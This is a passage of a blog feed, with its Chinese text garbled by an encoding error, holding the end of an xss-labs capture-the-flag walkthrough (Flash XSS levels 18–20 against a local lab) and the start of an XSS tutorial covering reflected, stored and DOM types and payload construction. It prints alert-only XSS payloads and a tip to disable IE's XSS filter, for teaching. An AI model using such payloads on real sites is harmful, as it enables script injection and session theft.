Flashè½¯ä»¶ç”Ÿæˆçš„ï¼Œæ›¾ç»å¹¿æ³›ç”¨äºç½‘é¡µè®¾è®¡å’Œåœ¨çº¿æ¸¸æˆç­‰é¢†åŸŸã€‚</p><p>ç”±äºå®‰å…¨é—®é¢˜ã€æ€§èƒ½é—®é¢˜ä»¥åŠç§»åŠ¨è®¾å¤‡å¯¹Flashæ”¯æŒçš„ä¸è¶³ï¼ŒAdobe Flashé€æ¸è¢«å¸‚åœºæ·˜æ±°ã€‚Adobeå…¬å¸åœ¨2020å¹´12æœˆ31æ—¥æ­£å¼åœæ­¢äº†å¯¹Flashçš„æ”¯æŒï¼Œå¹¶ä¸”ä»2021å¹´1æœˆ12æ—¥èµ·ï¼ŒFlashå†…å®¹æ— æ³•å†æ­£å¸¸è¿è¡Œã€‚ä¸»æµæµè§ˆå™¨å¦‚Chromeã€Firefoxå’ŒEdgeç­‰ä¹Ÿéƒ½åœ¨2020å¹´åº•æˆ–2021å¹´åˆåœæ­¢äº†å¯¹Flashçš„æ”¯æŒã€‚</p></blockquote><h2 id="å°ç»“-15"><a href="#å°ç»“-15" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬å…³çš„æœ¬æ„æ˜¯è€ƒå¯Ÿflashçš„xssæ”»å‡»ï¼Œä½†æ˜¯ç”±äºflashå·²ç»é€€å‡ºå†å²èˆå°ï¼Œå…³å¡ä¹Ÿæ²¡ä»€ä¹ˆæ„ä¹‰ã€‚</p><p>æ­¤å¤–é€šè¿‡å±æ€§é—­åˆçš„æ–¹æ³•ä¹Ÿå¯ä»¥è§¦å‘xssçš„æ‰§è¡Œã€‚</p><h1 id="åå…«ã€level-18ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰"><a href="#åå…«ã€level-18ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰" class="headerlink" title="åå…«ã€level-18ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰"></a>åå…«ã€level-18ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰</h1><p>åŒlelevel-17.</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.51.53.png" style="zoom:50%;"><h1 id="åä¹ã€level-19ï¼ˆflash-xssï¼‰"><a href="#åä¹ã€level-19ï¼ˆflash-xssï¼‰" class="headerlink" title="åä¹ã€level-19ï¼ˆflash xssï¼‰"></a>åä¹ã€level-19ï¼ˆflash xssï¼‰</h1><p>ç›®å‰ä¸»æµçš„æµè§ˆå™¨éƒ½ä¸å†æ”¯æŒflashäº†ã€‚åœ¨win2008æœåŠ¡å™¨ä¸Šç”¨åŒæ ·é€€å‡ºå†å²èˆå°çš„ieæµè§ˆå™¨åšä¸€ä¸‹å¤ç°å§ã€‚</p><p>å¦‚æœç¢°åˆ°ä¸‹é¢çš„ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Internet Explorer å·²å¯¹æ­¤é¡µé¢è¿›è¡Œäº†ä¿®æ”¹ï¼Œä»¥å¸®åŠ©é˜»æ­¢è·¨ç«™è„šæœ¬ã€‚å•å‡»æ­¤å¤„ï¼Œè·å–è¯¦ç»†ä¿¡æ¯<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2018.05.30.png" style="zoom:50%;"><p>ç‚¹å‡» IE9 çš„â€œå·¥å…·â€-&gt;â€œInternet é€‰é¡¹â€ï¼Œè¿›å…¥â€œå®‰å…¨â€é€‰é¡¹å¡ï¼Œæ‰“å¼€â€œInternetâ€å’Œâ€œå¯ä¿¡ç«™ç‚¹â€ä¸‹æ–¹çš„â€œè‡ªå®šä¹‰çº§åˆ«â€ï¼Œåœ¨â€œå®‰å…¨è®¾ç½®â€å¯¹è¯æ¡†ä¸­æ‰¾åˆ°â€œå¯ç”¨ XSS ç­›é€‰å™¨â€ï¼Œæ”¹ä¸ºâ€œç¦ç”¨â€å³å¯ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2018.08.03.png" style="zoom:80%;"><p>Payload:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1/xss-labs/level19.php?arg01<span class="token operator">=</span>version<span class="token operator">&amp;&amp;</span><span class="token assign-left variable">arg02</span><span class="token operator">=</span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"javascript:alert(1)"</span><span class="token operator">&gt;</span>xss<span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="äºŒåã€level-20ï¼ˆflash-xssï¼‰"><a href="#äºŒåã€level-20ï¼ˆflash-xssï¼‰" class="headerlink" title="äºŒåã€level-20ï¼ˆflash xssï¼‰"></a>äºŒåã€level-20ï¼ˆflash xssï¼‰</h1><p>Payload:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1/xss-labs/level20.php?arg01<span class="token operator">=</span>id<span class="token operator">&amp;&amp;</span><span class="token assign-left variable">arg02</span><span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">))</span><span class="token punctuation">}</span> catch<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span> //%26width<span class="token operator">=</span><span class="token number">500</span>%26height<span class="token operator">=</span><span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>19å’Œ20å…³ä»ç„¶æ˜¯é’ˆå¯¹flashç»„ä»¶çš„xssæ”»å‡»ï¼Œä¸è¿‡ç›®å‰çš„æµè§ˆå™¨éƒ½ä¸å†æ”¯æŒflashäº†ã€‚</p><p>ä¸åšè¯¦ç»†çš„ä»‹ç»ï¼Œæ„ä¹‰ä¸å¤§ï¼Œåªæ”¾äº†payloadã€‚æ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œç ”ç©¶ã€‚</p><h1 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è‡³æ­¤xss-labsåŸºæœ¬å®ç°äº†é€šå…³ï¼Œæ¯ä¸€å…³çš„å…³é”®è¦ç‚¹éƒ½åœ¨åé¢çš„å°æ‹¬å·ä¸­æ ‡æ˜äº†ã€‚è¿™ä¸ªé¶åœºä¸»è¦è¿˜æ˜¯ç»ƒä¹ åå°„å‹xssçš„è§¦å‘æ–¹æ³•ï¼Œæ²¡æœ‰é’ˆå¯¹å­˜å‚¨æ€§å’ŒDOMå‹çš„xssçš„é¢˜ç›®ï¼Œå¹¶ä¸”ç¼ºå°‘è¿›ä¸€æ­¥åˆ©ç”¨ï¼ˆæ‰§è¡Œshellcodeï¼‰çš„åœºæ™¯ç»ƒä¹ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è·¨ç«™è„šæœ¬æ”»å‡» </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> xss-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSè·¨ç«™è„šæœ¬æ”»å‡»</title>
      <link href="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/"/>
      <url>/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ç®€ä»‹å’ŒåŸºæœ¬æ¦‚å¿µ"><a href="#ä¸€ã€ç®€ä»‹å’ŒåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ä¸€ã€ç®€ä»‹å’ŒåŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€ç®€ä»‹å’ŒåŸºæœ¬æ¦‚å¿µ</h1><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡åœ¨ç½‘é¡µä¸­æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä½¿å…¶åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œä»è€Œçªƒå–ç”¨æˆ·ä¿¡æ¯ã€ä¼šè¯Cookieæˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚XSSæ”»å‡»é€šå¸¸åˆ†ä¸ºåå°„å‹ã€å­˜å‚¨å‹å’ŒDOMå‹ä¸‰ç§ç±»å‹ã€‚åå°„å‹XSSæ”»å‡»é€šè¿‡è¯±ä½¿ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥è§¦å‘ï¼Œå­˜å‚¨å‹XSSæ”»å‡»åˆ™å°†æ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå½±å“æ‰€æœ‰è®¿é—®è¯¥é¡µé¢çš„ç”¨æˆ·ï¼Œè€ŒDOMå‹XSSæ”»å‡»åˆ™å®Œå…¨åœ¨å®¢æˆ·ç«¯æ‰§è¡Œï¼Œä¸ç»è¿‡æœåŠ¡å™¨ã€‚XSSæ”»å‡»çš„å±å®³åŒ…æ‹¬çªƒå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹ã€å‘èµ·é’“é±¼æ”»å‡»ç­‰ã€‚é˜²å¾¡XSSæ”»å‡»çš„å…³é”®åœ¨äºå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ã€è¿‡æ»¤å’Œè½¬ä¹‰ï¼ŒåŒæ—¶ä½¿ç”¨å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ç­‰å®‰å…¨æœºåˆ¶æ¥é™åˆ¶è„šæœ¬çš„æ‰§è¡Œã€‚å¼€å‘è€…åº”å§‹ç»ˆéµå¾ªå®‰å…¨ç¼–ç è§„èŒƒï¼Œå®šæœŸè¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œä»¥æœ‰æ•ˆé˜²èŒƒXSSæ”»å‡»ï¼Œä¿æŠ¤ç”¨æˆ·æ•°æ®å’Œéšç§å®‰å…¨ã€‚</p><p> XSSè¢«ç§°ä¸ºè·¨ç«™è„šæœ¬æ”»å‡»(Cross-site scripting)ï¼Œæœ¬æ¥åº”è¯¥ç¼©å†™ä¸ºCSSï¼Œä½†æ˜¯ç”±äºå’ŒCSS (Cascading Style Sheetsï¼Œå±‚å æ ·å¼è„šæœ¬)é‡åï¼Œæ‰€ä»¥æ›´åä¸ºXSSã€‚XSS (è·¨ç«™è„šæœ¬æ”»å‡»)ä¸»è¦åŸºäºjavascript (JS) å®Œæˆæ¶æ„çš„æ”»å‡»è¡Œä¸ºã€‚JSå¯ä»¥éå¸¸çµæ´»çš„æ“ä½œhtmlã€csså’Œæµè§ˆå™¨ï¼Œè¿™ä½¿å¾—XSSæ”»å‡»çš„â€œæƒ³è±¡â€ç©ºé—´ç‰¹åˆ«å¤§ã€‚</p><h2 id="1-1-ç‰¹ç‚¹"><a href="#1-1-ç‰¹ç‚¹" class="headerlink" title="1.1 ç‰¹ç‚¹"></a>1.1 ç‰¹ç‚¹</h2><ul><li>å‘ç”Ÿçš„ä½ç½®ï¼šæœåŠ¡å™¨ã€‚</li><li>æ”»å‡»çš„ç›®æ ‡ï¼šæµè§ˆå™¨ã€ç”¨æˆ·ã€‚</li><li>æ¼æ´æˆå› ï¼šæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ã€‚</li><li>ä¸»è¦ä¾é çš„payloadä»£ç ï¼šjsã€‚</li><li>ä¸»è¦æ”»å‡»æ€è·¯ï¼šæ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥æœåŠ¡ç«¯ï¼Œå—å®³è€…åœ¨æ²¡æœ‰å®‰å…¨é˜²æŠ¤çš„å‰æä¸‹è®¿é—®æœåŠ¡ç«¯ç½‘ç«™ï¼Œæµè§ˆå™¨è§£ææ‰§è¡Œæ¶æ„çš„JSä»£ç ï¼Œå—å®³è€…è¢«æ”»å‡»ã€‚</li></ul><p>ä¸‰ä¸ªè§’è‰²ï¼šæ”»å‡»è€…ã€æœåŠ¡å™¨ã€æµè§ˆå™¨-å—å®³è€…-å®¢æˆ·ç«¯-ç”¨æˆ·</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-18%20%E4%B8%8B%E5%8D%886.05.23.png" style="zoom:35%;"><p>å¾®åšã€ç•™è¨€æ¿ã€èŠå¤©å®¤ç­‰ç­‰æ”¶é›†ç”¨æˆ·è¾“å…¥çš„åœ°æ–¹ï¼Œéƒ½æœ‰å¯èƒ½è¢«æ³¨å…¥XSSä»£ç ï¼Œéƒ½å­˜åœ¨é­å—XSSçš„é£é™©ï¼Œåªè¦<em>æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤</em>ï¼Œå°±ä¼šè¢«XSSã€‚</p><h2 id="1-2-å±å®³"><a href="#1-2-å±å®³" class="headerlink" title="1.2 å±å®³"></a>1.2 å±å®³</h2><ul><li>ç›—å–ç”¨æˆ·è´¦å·</li><li>ç›—å–cookie ï¼Œå†’å……ç™»é™†</li><li>åŠ«æŒä¼šè¯</li><li>åˆ·æµé‡ï¼Œæ‰§è¡Œå¼¹çª—å¹¿å‘Š</li><li>ä¼ æ’­è •è™«ç—…æ¯’</li></ul><blockquote><h4 id="æœ¯è¯­æ¦‚å¿µè¡¥å……ï¼š"><a href="#æœ¯è¯­æ¦‚å¿µè¡¥å……ï¼š" class="headerlink" title="æœ¯è¯­æ¦‚å¿µè¡¥å……ï¼š"></a>æœ¯è¯­æ¦‚å¿µè¡¥å……ï¼š</h4><p>PoCï¼ˆProof of Conceptï¼‰ï¼šæ¼æ´çš„éªŒè¯ä¸æ£€æµ‹</p><p>EXPï¼šæ¼æ´çš„å®Œæ•´åˆ©ç”¨å·¥å…·</p><p>shellcodeï¼šåˆ©ç”¨æ¼æ´æ—¶ï¼Œæ‰€æ‰§è¡Œçš„ä»£ç </p><p>payloadï¼šæ”»å‡»è½½è·</p><p>å¸¸ç”¨çš„XSS PoCï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="1-3-å®æˆ˜å¹³å°"><a href="#1-3-å®æˆ˜å¹³å°" class="headerlink" title="1.3 å®æˆ˜å¹³å°"></a>1.3 å®æˆ˜å¹³å°</h2><ul><li>DVWA XSS</li><li>Buuoj XSSç±»é¢˜ç›®</li><li>XSSé€šå…³å°æ¸¸æˆï¼š<ul><li>åœ¨çº¿åœ°å€ï¼š<a href="http://test.ctf8.com/">http://test.ctf8.com/</a></li><li>æœ¬åœ°æ­å»ºï¼šéœ€è¦php+mysqlçš„ç¯å¢ƒï¼Œæºä»£ç ï¼š<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a>  </li><li>æœ¬åœ°éƒ¨ç½²æ–¹æ³•å’Œwriteupï¼šè§æœ¬ç«™çš„ã€Šweb-xss-labsã€‹ä¸€æ–‡ã€‚</li></ul></li></ul><h1 id="äºŒã€XSSæ¼æ´åˆ†ç±»"><a href="#äºŒã€XSSæ¼æ´åˆ†ç±»" class="headerlink" title="äºŒã€XSSæ¼æ´åˆ†ç±»"></a>äºŒã€XSSæ¼æ´åˆ†ç±»</h1><h2 id="2-1-åå°„å‹XSSï¼š"><a href="#2-1-åå°„å‹XSSï¼š" class="headerlink" title="2.1 åå°„å‹XSSï¼š"></a>2.1 åå°„å‹XSSï¼š</h2><p>éæŒä¹…ã€å‚æ•°å‹ï¼ˆé€šè¿‡webå‚æ•°å˜é‡è§¦å‘ï¼‰ã€‚ åå°„å‹XSSæ˜¯éæŒä¹…æ€§ã€å‚æ•°å‹çš„è·¨ç«™è„šæœ¬æ”»å‡»ã€‚åå°„å‹XSSçš„JSä»£ç åœ¨Webåº”ç”¨çš„å‚æ•°(<strong>å˜é‡</strong>) ä¸­ï¼Œå¦‚æœç´¢æ¡†çš„åå°„å‹XSSã€‚</p><p>ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">åœ¨æœç´¢æ¡†ä¸­ï¼Œæäº¤PoC<span class="token punctuation">[</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span><span class="token punctuation">]</span>ï¼Œç‚¹å‡»æœç´¢ï¼Œå³å¯è§¦å‘åå°„å‹XSSã€‚æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬æäº¤çš„pocä¼šå‡ºç°åœ¨search.phpé¡µé¢çš„keywordså‚æ•°ä¸­ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="åå°„å‹xsså®æˆ˜"><a href="#åå°„å‹xsså®æˆ˜" class="headerlink" title="åå°„å‹xsså®æˆ˜"></a>åå°„å‹xsså®æˆ˜</h4><p>CMS åå°„å‹xsséªŒè¯ï¼š</p><p>æœç´¢æ¡†è¾“å…¥ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%886.50.09.png" a="" style="zoom:75%;"><p>æœç´¢çš„å…³é”®å­—è¢«å›æ˜¾ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%886.50.46.png" style="zoom:75%;"><p>xssæ¼æ´æµ‹è¯•ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250206103155068.png" style="zoom:75%;"><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%886.53.13.png" style="zoom:35%;"><p>æäº¤çš„PoCåœ¨keywordså‚æ•°ä¸­ã€‚</p></blockquote><h2 id="2-2-å­˜å‚¨å‹XSS"><a href="#2-2-å­˜å‚¨å‹XSS" class="headerlink" title="2.2 å­˜å‚¨å‹XSS"></a>2.2 å­˜å‚¨å‹XSS</h2><p>  å­˜å‚¨å‹XSSæ˜¯æŒä¹…æ€§è·¨ç«™è„šæœ¬æ”»å‡»ã€‚æŒä¹…æ€§ä½“ç°åœ¨XSSä»£ç ä¸æ˜¯åœ¨æŸä¸ªå‚æ•°(å˜é‡) ä¸­ï¼Œè€Œæ˜¯å†™è¿›æ•°æ®åº“æˆ–æ–‡ä»¶ç­‰å¯ä»¥æ°¸ä¹…ä¿å­˜æ•°æ®çš„ä»‹è´¨ä¸­ã€‚</p><p>   å­˜å‚¨å‹XSSé€šå¸¸å‘ç”Ÿåœ¨ç•™è¨€æ¿ç­‰åœ°æ–¹ã€‚æˆ‘ä»¬åœ¨ç•™è¨€æ¿ä½ç½®ç•™è¨€ï¼Œå°†æ¶æ„ä»£ç å†™è¿›æ•°æ®åº“ä¸­ã€‚ æ­¤æ—¶ï¼Œæˆ‘ä»¬åªå®Œæˆäº†ç¬¬ä¸€æ­¥ï¼Œå°†æ¶æ„ä»£ç å†™å…¥æ•°æ®åº“ã€‚å› ä¸ºXSSä½¿ç”¨çš„JSä»£ç ï¼ŒJSä»£ç çš„è¿è¡Œç¯å¢ƒæ˜¯æµè§ˆå™¨ï¼Œæ‰€ä»¥éœ€è¦æµè§ˆå™¨ä»æœåŠ¡å™¨è½½å…¥æ¶æ„çš„XSSä»£ç ï¼Œæ‰èƒ½çœŸæ­£è§¦å‘XSSã€‚æ­¤æ—¶ï¼Œéœ€è¦æˆ‘ä»¬æ¨¡æ‹Ÿç½‘ç«™åå°ç®¡ç†å‘˜çš„èº«ä»½ï¼ŒæŸ¥çœ‹ç•™è¨€ã€‚</p><blockquote><h4 id="å­˜å‚¨å‹XSSå®æˆ˜"><a href="#å­˜å‚¨å‹XSSå®æˆ˜" class="headerlink" title="å­˜å‚¨å‹XSSå®æˆ˜"></a>å­˜å‚¨å‹XSSå®æˆ˜</h4><p> ç•™è¨€æ¿æ¶æ„ç•™è¨€ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.05.34.png" style="zoom:45%;"><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.06.16.png" style="zoom:45%;"><p>ç®¡ç†å‘˜å®¡æ ¸ï¼ˆç®¡ç†å‘˜è¢«æ„ŸæŸ“ï¼‰ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.07.11.png" style="zoom:45%;"><p>ä¸€æ—¦é€šè¿‡å®¡æ ¸å…¶ä»–èƒ½çœ‹åˆ°æ­¤ç•™è¨€çš„ç”¨æˆ·å‡ä¼šè¢«æ„ŸæŸ“ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.07.40.png" style="zoom:45%;"></blockquote><h2 id="2-3-DOMå‹XSS"><a href="#2-3-DOMå‹XSS" class="headerlink" title="2.3 DOMå‹XSS"></a>2.3 DOMå‹XSS</h2><p>DOM XSSæ¯”è¾ƒç‰¹æ®Šã€‚owaspå…³äºDOMå‹XSSçš„å®šä¹‰æ˜¯ï¼šåŸºäºDOMçš„XSSæ˜¯ä¸€ç§XSSæ”»å‡»ï¼Œå…¶ä¸­æ”»å‡»çš„payloadç”±äºä¿®æ”¹å—å®³è€…æµè§ˆå™¨é¡µé¢çš„DOMæ ‘è€Œæ‰§è¡Œçš„ã€‚å…¶ç‰¹æ®Šçš„åœ°æ–¹å°±æ˜¯payloadåœ¨æµè§ˆå™¨æœ¬åœ°ä¿®æ”¹DOMæ ‘è€Œæ‰§è¡Œï¼Œå¹¶ä¸ä¼šä¼ åˆ°æœåŠ¡å™¨ ä¸Šï¼Œè¿™ä¹Ÿå°±ä½¿å¾—DOM XSSæ¯”è¾ƒéš¾ä»¥æ£€æµ‹ã€‚</p><p>å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="DOMå‹XSSå®æˆ˜"><a href="#DOMå‹XSSå®æˆ˜" class="headerlink" title="DOMå‹XSSå®æˆ˜"></a>DOMå‹XSSå®æˆ˜</h4><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.12.59.png" style="zoom:55%;"><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.13.10.png" style="zoom:35%;"><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.13.54.png" style="zoom:45%;"><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.14.23.png" style="zoom:45%;"><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.14.52.png" style="zoom:45%;"><p>æºä»£ç ä¸­æ²¡æœ‰PoC</p><p>ä½†æ˜¯DOMæ ‘ä¸­æœ‰ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.15.23.png" style="zoom:35%;"><p>å…ƒç´ æŸ¥çœ‹å™¨ä¸­å¯ä»¥çœ‹åˆ°PoCã€‚åŸå› ï¼š<strong>ä¿®æ”¹DOMæ ‘åï¼Œæµè§ˆå™¨é‡æ–°æ¸²æŸ“é¡µé¢ï¼Œæ‰§è¡ŒPoC</strong>ã€‚</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%887.18.02.png" style="zoom:45%;"><p>?æ”¹æˆ#ä¹Ÿèƒ½å¼¹çª—ã€‚</p><p>#åé¢çš„å†…å®¹æ˜¯é”šç‚¹å†…å®¹ï¼Œä¸ä¼šæäº¤åˆ°æœåŠ¡å™¨ï¼Œæ‰€ä»¥æœåŠ¡å™¨ä¹Ÿå°±æ£€æµ‹ä¸åˆ°è¯¥XSSæ”»å‡»ã€‚</p><p>é˜²å¾¡-æµè§ˆå™¨å®‰è£…é˜²XSSçš„åŠŸèƒ½ã€‚</p></blockquote><h1 id="ä¸‰ã€XSSä»£ç çš„æ„é€ "><a href="#ä¸‰ã€XSSä»£ç çš„æ„é€ " class="headerlink" title="ä¸‰ã€XSSä»£ç çš„æ„é€ "></a>ä¸‰ã€XSSä»£ç çš„æ„é€ </h1><h2 id="3-1-å››ç§æ„é€ æ–¹æ³•"><a href="#3-1-å››ç§æ„é€ æ–¹æ³•" class="headerlink" title="3.1 å››ç§æ„é€ æ–¹æ³•"></a>3.1 å››ç§æ„é€ æ–¹æ³•</h2><h3 id="3-1-1-åˆ©ç”¨æ„é€ HTML-JSä»£ç "><a href="#3-1-1-åˆ©ç”¨æ„é€ HTML-JSä»£ç " class="headerlink" title="3.1.1 åˆ©ç”¨<>æ„é€ HTML/JSä»£ç "></a>3.1.1 åˆ©ç”¨&lt;&gt;æ„é€ HTML/JSä»£ç </h3><p>å¯ä»¥åˆ©ç”¨[&lt;&gt;]æ„é€ HTML æ ‡ç­¾å’Œ<code>&lt;script&gt;</code>æ ‡ç­¾ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>video src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>audio src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-ä¼ªåè®®"><a href="#3-1-2-ä¼ªåè®®" class="headerlink" title="3.1.2 ä¼ªåè®®"></a>3.1.2 ä¼ªåè®®</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert(/xss/)"</span><span class="token operator">&gt;</span>touch me<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span 